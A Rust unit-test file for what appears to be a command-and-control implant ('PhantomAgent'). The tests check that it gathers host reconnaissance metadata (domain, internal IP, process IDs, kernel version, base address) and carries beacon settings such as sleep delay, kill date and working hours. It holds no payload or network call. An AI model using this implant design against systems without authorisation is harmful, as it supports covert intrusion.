use std::error::Error;

use super::super::PhantomAgent;
use super::encode_working_hours;
use crate::config::PhantomConfig;

#[test]
fn collect_metadata_collects_real_linux_values() -> Result<(), Box<dyn Error>> {
    let agent = PhantomAgent::new(PhantomConfig::default())?;
    let metadata = agent.collect_metadata();

    // Domain name must be non-empty; on machines not joined to a domain it
    // should fall back to "WORKGROUP".
    assert!(!metadata.domain_name.is_empty());

    // Internal IP must not be the placeholder loopback; the UDP-connect
    // trick should resolve the default-route source address.
    assert!(!metadata.internal_ip.is_empty());
    assert_ne!(metadata.internal_ip, "0.0.0.0");

    // TID should be a real kernel-assigned value (always > 0).
    assert!(metadata.process_tid > 0, "expected non-zero TID, got {}", metadata.process_tid);

    // PID must be positive.
    assert!(metadata.process_pid > 0);

    // OS major must be a plausible Linux kernel major version (>= 4).
    assert!(metadata.os_major >= 4, "expected Linux kernel major >= 4, got {}", metadata.os_major);

    // Base address: either 0 (PIE disabled) or a valid user-space address.
    // We just verify the field is populated without panicking.
    let _ = metadata.base_address;

    Ok(())
}

#[test]
fn collect_metadata_converts_sleep_delay_ms_to_seconds() -> Result<(), Box<dyn Error>> {
    let config = PhantomConfig { sleep_delay_ms: 10_000, ..PhantomConfig::default() };
    let agent = PhantomAgent::new(config)?;
    let metadata = agent.collect_metadata();
    assert_eq!(metadata.sleep_delay, 10, "10000 ms should be reported as 10 seconds");
    Ok(())
}

#[test]
fn collect_metadata_rounds_sub_second_sleep_delay_to_nearest() -> Result<(), Box<dyn Error>> {
    let config_500 = PhantomConfig { sleep_delay_ms: 500, ..PhantomConfig::default() };
    let agent_500 = PhantomAgent::new(config_500)?;
    assert_eq!(agent_500.collect_metadata().sleep_delay, 1, "500 ms should round to 1 s");

    let config_499 = PhantomConfig { sleep_delay_ms: 499, ..PhantomConfig::default() };
    let agent_499 = PhantomAgent::new(config_499)?;
    assert_eq!(agent_499.collect_metadata().sleep_delay, 0, "499 ms should round to 0 s");

    let config_1499 = PhantomConfig { sleep_delay_ms: 1_499, ..PhantomConfig::default() };
    let agent_1499 = PhantomAgent::new(config_1499)?;
    assert_eq!(agent_1499.collect_metadata().sleep_delay, 1, "1499 ms should round to 1 s");

    let config_1500 = PhantomConfig { sleep_delay_ms: 1_500, ..PhantomConfig::default() };
    let agent_1500 = PhantomAgent::new(config_1500)?;
    assert_eq!(agent_1500.collect_metadata().sleep_delay, 2, "1500 ms should round to 2 s");
    Ok(())
}

#[test]
fn collect_metadata_includes_kill_date_from_config() -> Result<(), Box<dyn Error>> {
    let config = PhantomConfig { kill_date: Some(1_893_456_000), ..PhantomConfig::default() };
    let agent = PhantomAgent::new(config)?;
    let metadata = agent.collect_metadata();
    assert_eq!(metadata.kill_date, 1_893_456_000);
    Ok(())
}

#[test]
fn collect_metadata_includes_working_hours_from_config() -> Result<(), Box<dyn Error>> {
    let wh = encode_working_hours(9, 0, 17, 0);
    let config = PhantomConfig { working_hours: Some(wh), ..PhantomConfig::default() };
    let agent = PhantomAgent::new(config)?;
    let metadata = agent.collect_metadata();
    assert_eq!(metadata.working_hours, wh);
    Ok(())
}
